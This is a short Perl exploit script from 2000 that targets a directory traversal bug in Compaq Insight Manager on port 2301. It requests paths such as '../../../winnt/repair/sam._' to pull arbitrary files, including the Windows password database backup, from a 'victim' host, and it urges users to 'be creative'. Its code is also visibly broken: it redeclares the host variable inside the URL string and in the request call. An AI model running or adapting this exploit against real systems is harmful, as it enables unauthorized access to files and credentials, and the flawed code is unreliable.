#!/usr/bin/perl
#
# NOTE: This version works on *nix/NT/9x etc. (OS independant)
#
# Compaq Insight Manager "Root Dot Dot" Bug By Neon-Lenz
# ------------------------------------------------------
# E-Mail:  neonlenz@hushmail.com
# Website: http://TheGovernment.Com/Cyrax
#
# Usage: ./cim.pl <host> <directory> <file>
#
# Example: ./cim.pl www.victim.com /winnt /win.ini 
# Another Example: ./cim.pl www.victim.com /winnt/repair /sam._ (Just be creative!) :)

use strict;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Response;

my $ua = new LWP::UserAgent;
my $host=$ARGV[0] || "www.victim.com";
my $directory=$ARGV[1] || "/winnt";
my $file=$ARGV[2] || "/win.ini";

my $host="http://my $host:2301/../../..$directory$file";

print <<"EOT";

Compaq Insight Manager "Root Dot Dot Bug" - Neon-Lenz
-----------------------------------------------------
Usage: ./cim.pl <host> <directory> <file>
Example: ./cim.pl www.victim.com /winnt /win.ini (Just be creative!) :)

EOT

my $request = new HTTP::Request('GET', my $host);
my $response = $ua->request($request);
if ($response->is_success)  {
  print $response->content;
  } else  {
  print $response->error_as_HTML;
}
#                   www.hack.co.za   [6 September 2000]#